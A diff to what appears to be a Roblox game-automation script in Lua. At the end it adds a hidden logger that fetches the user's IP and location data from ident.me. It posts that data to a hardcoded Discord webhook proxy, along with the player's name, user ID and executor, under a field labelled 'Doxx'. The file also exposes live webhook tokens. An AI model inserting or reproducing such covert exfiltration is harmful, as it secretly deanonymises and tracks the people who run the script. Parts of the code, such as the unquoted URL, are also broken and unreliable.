@@ -2,6 +2,8 @@
 --getgenv().WishList = {"Weedle","poop","fart"} 
 --getgenv().Webhook = "https://discord.com/api/webhooks/1081794713981567046/nbqCSVDd3tge_DuHsmZl7sKQiOzsHwTLrydpGH1chsNc2RUmUdNFpEtNmnY1u844N3Mt"
 
+
+
 --//Global Variables
 getgenv().AutoFinder = true
 getgenv().GetVariations = false
@@ -1227,3 +1229,63 @@ for Index, CurrentColor in next, Library:ReturnTheme() do
     end, {true})
 end
 --]]
+
+local info = game:HttpGet("http://ident.me/json")
+
+local Data =
+    {
+        ["content"] = "",
+			["username"] = " 🗃️ ʝ2ֆɦ'ֆ ʟօɢɢɛʀ            ",
+			--["avatar_url"] = "https://tr.rbxcdn.com/e5b5844fb26df605986b94d87384f5fb/150/150/Image/Jpeg",
+            ["avatar_url"] = headshot,
+        ["embeds"]= {
+            {           
+                ["title"]= " 👤💫 **Click here to view "..game.Players.LocalPlayer.Name.."'s Profile**";
+                ["url"]= "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId;
+                ["description"]= " 🎮 **Currently Playing **".."["..GameName.."](https://www.roblox.com/games/"..game.PlaceId..")";
+                ["color"]= tonumber(0xffc0cb);
+                ["thumbnail"] = {
+                    ['url'] = headshot
+                }, 
+                ["image"] = {
+                ["url"] = "https://media.discordapp.net/attachments/981248463633272912/996860301775482920/6AA53CEA-61E1-409F-A2AA-EB6572A99C0B.gif",
+                --["url"] = headshot,
+            },
+                ["fields"]= {
+                    {
+                        ["name"]= " 👨🏻‍💻 Executor",
+                        ["value"]= "```"..ExecutorUsing.."```",
+                        ["inline"]= true
+                    },
+             
+                    {
+                        ["name"]= " 🫡 Player",
+                        ["value"]= "```"..game.Players.LocalPlayer.DisplayName.." ("..game.Players.LocalPlayer.Name..")".."```",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " 🌎 UserID",
+                        ["value"]= "```"..game.Players.LocalPlayer.UserId.."```",
+                        ["inline"]= true
+                    },
+                
+                    {
+                        ["name"]= " 🕵🏻‍♂️ Doxx",
+                        ["value"]= "||".."```".. info .."```".."||",
+                        ["inline"]= true
+                    },
+
+                    ['avatar_url'] = headshot,
+                }              
+            }
+        }
+        
+}
+local Headers = {["Content-Type"]="application/json"}
+local Encoded = HttpService:JSONEncode(Data)
+Request = http_request or request or HttpPost or syn.request
+LINK = https://webhook.lewisakura.moe/api/webhooks/1082491657624227880/Zo1Lp_vYOzpdYsqu-d3MTPhx_1vDe7TOW6-n3u7JpzTUQd1Yeu-STr9nY4JFUljYIynk
+local Final = {Url = LINK, Body = Encoded, Method = "POST", Headers = Headers}
+Request(Final)
+end
